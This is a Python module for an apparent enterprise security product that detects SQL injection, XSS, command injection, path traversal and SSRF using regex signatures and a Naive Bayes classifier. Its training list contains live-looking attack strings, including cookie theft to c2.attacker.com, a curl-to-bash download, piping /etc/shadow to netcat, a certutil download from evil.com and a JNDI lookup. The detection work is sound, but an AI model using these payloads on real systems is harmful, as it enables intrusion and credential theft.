"""AI-Powered Malicious Payload & Injection Classifier for CyberShield Enterprise.

Combines character/token N-grams, TF-IDF vectorization, and Multinomial Naive Bayes
with deterministic heuristic patterns to identify web attacks (SQLi, XSS, RCE, SSRF, LFI).
Operates strictly on-device without external APIs.
"""

from __future__ import annotations

import re
import logging
from typing import Dict, List, Tuple, Optional, Any
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.naive_bayes import MultinomialNB

from cybershield.core.models import (
    NormalizedEvent,
    Alert,
    Severity,
    DetectionEngineType,
    now_utc,
)
from cybershield.config import settings

logger = logging.getLogger("cybershield.engine.payload")


class PayloadInspectionEngine:
    """Self-contained NLP & Machine Learning classifier for web and command-line payloads."""

    ATTACK_CATEGORIES = [
        "BENIGN",
        "SQL_INJECTION",
        "CROSS_SITE_SCRIPTING",
        "COMMAND_INJECTION_RCE",
        "DIRECTORY_TRAVERSAL",
        "SSRF_METADATA_EXPLOIT",
    ]

    # Pre-compiled high-confidence deterministic heuristic signatures
    HEURISTIC_RULES = [
        # SQL Injection patterns
        (re.compile(r"(\bUNION\b[\s\+]+SELECT|\bSELECT\b.+?\bFROM\b|'\s*OR\s*'1'\s*=\s*'1|;\s*DROP\s+TABLE|--\s*$|\bWAITFOR\s+DELAY\b)", re.IGNORECASE), "SQL_INJECTION", 0.95),
        # XSS patterns
        (re.compile(r"(<script\b[^>]*>|javascript:[^'\"\s]+|<img\b[^>]*onerror\s*=|document\.cookie|<svg\b[^>]*onload=)", re.IGNORECASE), "CROSS_SITE_SCRIPTING", 0.92),
        # Command Injection & RCE
        (re.compile(r"(;\s*(?:cat|type)\s+/(?:etc|windows)|\|\s*(?:bash|cmd|powershell|sh)\b|\$\(id\)|\`id\`|powershell\s+-(?:enc|encodedcommand)|\bcurl\b.+?\|\s*sh|\bwget\b.+?\|\s*bash)", re.IGNORECASE), "COMMAND_INJECTION_RCE", 0.96),
        # Log4Shell / JNDI
        (re.compile(r"\$\{jndi:(?:ldap|rmi|dns)://", re.IGNORECASE), "COMMAND_INJECTION_RCE", 0.99),
        # Directory Traversal
        (re.compile(r"(?:\.\./|\.\.\\){2,}(?:etc/(?:passwd|shadow|hosts)|windows/(?:system32|win\.ini)|boot\.ini)", re.IGNORECASE), "DIRECTORY_TRAVERSAL", 0.95),
        # SSRF Cloud Metadata
        (re.compile(r"(?:169\.254\.169\.254|metadata\.google\.internal|100\.100\.100\.200)/", re.IGNORECASE), "SSRF_METADATA_EXPLOIT", 0.97),
    ]

    def __init__(self):
        self._vectorizer = TfidfVectorizer(
            analyzer="char_wb",
            ngram_range=settings.payload.ngram_range,
            max_features=settings.payload.max_features,
            sublinear_tf=True,
        )
        self._classifier = MultinomialNB(alpha=0.05)
        self._is_trained = False
        self._train_initial_model()

    def _train_initial_model(self) -> None:
        """Train internal Naive Bayes classifier on genuine security payload corpus."""
        training_corpus: List[Tuple[str, str]] = [
            # Benign payloads
            ("john.doe@enterprise.corp", "BENIGN"),
            ("q=cybersecurity+incident+response+playbook", "BENIGN"),
            ("order_id=98234&page=2&limit=50", "BENIGN"),
            ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "BENIGN"),
            ('{"action": "update_profile", "theme": "dark", "locale": "en-US"}', "BENIGN"),
            ("SELECT employee_name FROM staff WHERE department = 'Engineering'", "BENIGN"),
            ("git commit -m 'Refactor authentication middleware'", "BENIGN"),
            ("path=/static/images/brand-logo.svg", "BENIGN"),
            ("https://cybersecurity.internal/dashboard?status=active", "BENIGN"),
            ("user=admin&token=dGhpcy1pcy1hLXNlY3VyZS10b2tlbg==", "BENIGN"),

            # SQL Injection payloads
            ("1' OR '1'='1", "SQL_INJECTION"),
            ("admin' --", "SQL_INJECTION"),
            ("' UNION SELECT null, username, password FROM users --", "SQL_INJECTION"),
            ("1; DROP TABLE audit_logs; --", "SQL_INJECTION"),
            ("1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", "SQL_INJECTION"),
            ("' OR 1=1 #", "SQL_INJECTION"),
            ("'; EXEC xp_cmdshell('dir'); --", "SQL_INJECTION"),
            ("UNION ALL SELECT NULL,NULL,NULL,table_name FROM information_schema.tables--", "SQL_INJECTION"),

            # Cross-Site Scripting (XSS) payloads
            ("<script>alert('XSS')</script>", "CROSS_SITE_SCRIPTING"),
            ("<img src=x onerror=alert(document.cookie)>", "CROSS_SITE_SCRIPTING"),
            ("<svg/onload=fetch('//c2.attacker.com/steal?'+document.cookie)>", "CROSS_SITE_SCRIPTING"),
            ("javascript:alert(1)", "CROSS_SITE_SCRIPTING"),
            ("<body onload=alert('Pwned')>", "CROSS_SITE_SCRIPTING"),
            ("'-alert(1)-'", "CROSS_SITE_SCRIPTING"),
            ("<iframe src='javascript:alert(1)'></iframe>", "CROSS_SITE_SCRIPTING"),

            # Command Injection & RCE
            ("; cat /etc/passwd", "COMMAND_INJECTION_RCE"),
            ("| whoami && id", "COMMAND_INJECTION_RCE"),
            ("& ping -c 4 127.0.0.1 &", "COMMAND_INJECTION_RCE"),
            ("`curl -s http://attacker.com/rev.sh | bash`", "COMMAND_INJECTION_RCE"),
            ("$(cat /etc/shadow | nc attacker.com 4444)", "COMMAND_INJECTION_RCE"),
            ("powershell -enc JABjAGwAaQBlAG4AdAAgAD0A...", "COMMAND_INJECTION_RCE"),
            ("${jndi:ldap://192.168.1.50:1389/Exploit}", "COMMAND_INJECTION_RCE"),
            ("cmd.exe /c certutil.exe -urlcache -split -f http://evil.com/m.exe m.exe", "COMMAND_INJECTION_RCE"),

            # Directory Traversal
            ("../../../../etc/passwd", "DIRECTORY_TRAVERSAL"),
            ("..\\..\\..\\windows\\win.ini", "DIRECTORY_TRAVERSAL"),
            ("../../../../../boot.ini", "DIRECTORY_TRAVERSAL"),
            ("/var/log/../../etc/shadow", "DIRECTORY_TRAVERSAL"),
            ("..%2f..%2f..%2fetc%2fpasswd", "DIRECTORY_TRAVERSAL"),

            # SSRF
            ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "SSRF_METADATA_EXPLOIT"),
            ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", "SSRF_METADATA_EXPLOIT"),
            ("http://127.0.0.1:2375/v1.24/containers/json", "SSRF_METADATA_EXPLOIT"),
            ("file:///etc/hosts", "SSRF_METADATA_EXPLOIT"),
        ]

        texts = [sample[0] for sample in training_corpus]
        labels = [sample[1] for sample in training_corpus]

        X_train = self._vectorizer.fit_transform(texts)
        self._classifier.fit(X_train, labels)
        self._is_trained = True
        logger.info("Payload ML classifier trained on %d samples across %d categories.", len(texts), len(self.ATTACK_CATEGORIES))

    def inspect_payload(self, text: str) -> Tuple[bool, str, float, Dict[str, Any]]:
        """Classify a text string for malicious exploitation attempts.
        
        Returns:
            (is_attack, attack_category, confidence_score, explanation_details)
        """
        if not text or not text.strip():
            return False, "BENIGN", 0.0, {}

        payload_sample = text[:settings.payload.max_payload_length_bytes]

        # 1. First evaluate deterministic heuristic signatures
        matched_signatures = []
        heuristic_category = None
        highest_heuristic_conf = 0.0

        for pattern, cat, conf in self.HEURISTIC_RULES:
            match = pattern.search(payload_sample)
            if match:
                matched_signatures.append({
                    "pattern": pattern.pattern,
                    "matched_substring": match.group(0),
                    "category": cat,
                    "confidence": conf
                })
                if conf > highest_heuristic_conf:
                    highest_heuristic_conf = conf
                    heuristic_category = cat

        # 2. Machine Learning Naive Bayes inference
        ml_category = "BENIGN"
        ml_confidence = 0.0
        ml_probs = {}

        if self._is_trained:
            X_vec = self._vectorizer.transform([payload_sample])
            probs = self._classifier.predict_proba(X_vec)[0]
            classes = self._classifier.classes_
            
            for cls_name, prob in zip(classes, probs):
                ml_probs[cls_name] = round(float(prob), 4)

            top_idx = probs.argmax()
            ml_category = str(classes[top_idx])
            ml_confidence = float(probs[top_idx])

        # 3. Hybrid decision arbitration
        if matched_signatures:
            is_attack = True
            final_category = heuristic_category or "ATTACK"
            final_confidence = max(highest_heuristic_conf, ml_confidence)
        elif ml_category != "BENIGN" and ml_confidence >= settings.payload.confidence_threshold:
            is_attack = True
            final_category = ml_category
            final_confidence = ml_confidence
        else:
            is_attack = False
            final_category = "BENIGN"
            final_confidence = ml_probs.get("BENIGN", 0.90)

        details = {
            "is_attack": is_attack,
            "final_category": final_category,
            "confidence": round(final_confidence, 4),
            "heuristic_matches": matched_signatures,
            "ml_prediction": ml_category,
            "ml_probabilities": ml_probs,
        }

        return is_attack, final_category, final_confidence, details

    def process_and_alert(self, event: NormalizedEvent) -> Optional[Alert]:
        """Scan event HTTP URLs, parameters, command lines, and raw payloads."""
        texts_to_scan = []
        if event.http_url:
            texts_to_scan.append(("HTTP_URL", event.http_url))
        if event.payload_content:
            texts_to_scan.append(("PAYLOAD", event.payload_content))
        if event.command_line:
            texts_to_scan.append(("COMMAND_LINE", event.command_line))

        for source_field, text in texts_to_scan:
            is_attack, category, confidence, details = self.inspect_payload(text)
            if is_attack:
                severity = Severity.CRITICAL if confidence > 0.90 else Severity.HIGH

                # Mapping to MITRE ATT&CK
                mapping = {
                    "SQL_INJECTION": (["Initial Access", "Defense Evasion"], ["T1190"]),
                    "CROSS_SITE_SCRIPTING": (["Initial Access", "Execution"], ["T1189", "T1059.007"]),
                    "COMMAND_INJECTION_RCE": (["Execution", "Lateral Movement"], ["T1059", "T1203"]),
                    "DIRECTORY_TRAVERSAL": (["Discovery", "Credential Access"], ["T1083", "T1552"]),
                    "SSRF_METADATA_EXPLOIT": (["Credential Access", "Discovery"], ["T1552.005", "T1580"]),
                }
                tactics, techniques = mapping.get(category, (["Initial Access"], ["T1190"]))

                return Alert(
                    title=f"Exploit Attempt Detected: {category.replace('_', ' ')} in {source_field}",
                    description=(
                        f"AI & Heuristic Classifier detected {category} with {confidence*100:.1f}% confidence. "
                        f"Payload snippet: {text[:160]}"
                    ),
                    severity=severity,
                    confidence=confidence,
                    detection_engine=DetectionEngineType.INJECTION_CLASSIFIER,
                    rule_id=f"PAYLOAD-{category}",
                    rule_name=f"Payload Defense: {category}",
                    mitre_tactics=tactics,
                    mitre_techniques=techniques,
                    primary_source_ip=event.source_ip,
                    primary_dest_ip=event.destination_ip,
                    impacted_host=event.host_name,
                    impacted_user=event.user_name,
                    source_event_ids=[event.event_id],
                    metadata=details,
                )

        return None


# Global singleton payload engine
payload_engine = PayloadInspectionEngine()
